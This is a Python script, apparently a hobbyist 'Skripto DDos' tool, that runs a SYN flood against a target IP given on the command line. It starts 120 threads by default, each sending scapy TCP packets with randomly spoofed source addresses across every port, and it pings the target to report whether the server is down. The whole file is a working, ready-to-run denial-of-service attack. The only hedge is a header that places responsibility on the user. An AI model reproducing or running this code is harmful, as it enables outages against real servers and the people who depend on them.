# Who is using this script have the 100% of responsabilities and aftermath about their actions.

# (@u@) scripted by Skripto (@YourAnonSkripto) (@u@)

#      " Keyboard is more powerful than a nuke. "

import threading, random, colorama, pythonping, time, os, optparse
import scapy.all as scapy

os.system('clear')

class TCPflooder:
    def __init__(self):
        self.TARGET = ''
        self.PORT = 0
        self.THNUMBER = 120
        self.COUNTER = 0
        self.STOP = True
        self.MS = '0'
        
        self.PARAMETERS()

        print('\n\t~~> '+colorama.Fore.LIGHTRED_EX+'Skripto DDos '+colorama.Fore.RESET+'('+colorama.Fore.LIGHTGREEN_EX+'SYN flood'+colorama.Fore.RESET+')\n\n'
        +colorama.Fore.LIGHTRED_EX+' ~>> '+colorama.Fore.RESET+'Target: '+colorama.Fore.LIGHTGREEN_EX+self.TARGET+'\n'
        +colorama.Fore.LIGHTRED_EX+' ~>> '+colorama.Fore.RESET+'Threads: '+colorama.Fore.LIGHTGREEN_EX+str(self.THNUMBER)+colorama.Fore.RESET+'\n'
        +colorama.Fore.LIGHTRED_EX+'\n CNTRL+C '+colorama.Fore.RESET+'to stop threads.','\n')

        for NUM in range(self.THNUMBER):
            TH = threading.Thread(target=self.DDOS)
            TH.start()
        TH = threading.Thread(target=self.PING)
        TH.start()

        while self.STOP:
            try:
                if self.COUNTER != 00000000000000000:
                    print('\r  ~> '+colorama.Fore.LIGHTRED_EX+str(self.COUNTER)+colorama.Fore.RESET+' packets sent: ms '
                    +colorama.Fore.LIGHTRED_EX+str(self.MS)+colorama.Fore.RESET,end='')
                else:
                    print(colorama.Fore.RED+'\r Server maybe down.'+colorama.Fore.RESET, end='')
            except KeyboardInterrupt:
                self.STOP = False

        print(colorama.Fore.LIGHTRED_EX+'\n\n ~>>'+colorama.Fore.RESET+' Stopping threads ...\n')

    def PARAMETERS(self):
        PARSER = optparse.OptionParser()
        PARSER.add_option('--target',metavar='< IP >',action='store',dest='TRGT',help='Enter the Target\'s IP,')
        PARSER.add_option('--threads',metavar='< N. Threads >',action='store',dest='POW',help='DDos power, default 120,')
        self.PRMTRS = PARSER.parse_args()[0]

        if not self.PRMTRS.TRGT:
            print('\n '+colorama.Back.LIGHTRED_EX+'Please compile the "--target" option.\n'+colorama.Back.RESET)
            exit()
        else:
            DOT = 0
            for CHAR in self.PRMTRS.TRGT:
                try:
                    int(CHAR)
                except:
                    if CHAR == '.':
                        DOT += 1
                    else:
                        print('\n '+colorama.Back.LIGHTRED_EX+'Invalid target.\n'+colorama.Back.RESET)
                        exit()
            if not DOT == 3:
                print('\n '+colorama.Back.LIGHTRED_EX+'Invalid target.\n'+colorama.Back.RESET)
                exit()
        if self.PRMTRS.POW:
            self.THNUMBER = int(self.PRMTRS.POW)
        self.TARGET = self.PRMTRS.TRGT

    def SPOOFING(self):
        if self.PORT == 65535:
            self.PORT = 1
        else:
            self.PORT += 1

        SPORT = random.randint(1,65535)
        SRC_IP = str(random.randint(1,255))+'.'+str(random.randint(1,255))+'.'+str(random.randint(1,255))+'.'+str(random.randint(1,255))

        return scapy.IP(src=SRC_IP, dst=self.TARGET)/scapy.TCP(sport=SPORT, dport=self.PORT)

    def DDOS(self):
        while self.STOP:
            try:
                scapy.send(self.SPOOFING(), verbose=False, inter=0)
                self.COUNTER += 1
            except:
                self.COUNTER = 00000000000000000

    def PING(self):
        while self.STOP:
            time.sleep(2)
            try:
                MS = pythonping.ping(self.TARGET, verbose=False)
                MS = str(MS).split('ms')[0]
                MS = MS.split(' ')[6]

                if len(self.MS) > 5:
                    self.MS = self.MS[:-1]
                self.MS = MS

            except:
                continue       

TCPflooder()